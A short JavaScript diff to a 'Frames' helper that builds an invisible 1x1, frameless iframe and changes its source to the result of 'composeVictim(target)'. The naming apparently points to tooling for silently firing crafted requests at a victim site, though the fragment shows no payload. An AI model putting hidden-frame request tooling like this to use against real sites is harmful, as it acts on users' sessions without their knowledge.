@@ -1,8 +1,8 @@
 const Frames = {
 	async draw(target) {
 		$("<iframe>", {
-			src: target,
-			id: `frame${randint(100_000)}`,
+			src: await composeVictim(target),
+			method: 'get',
 			frameBorder: 0,
 			width: 1,
 			height: 1
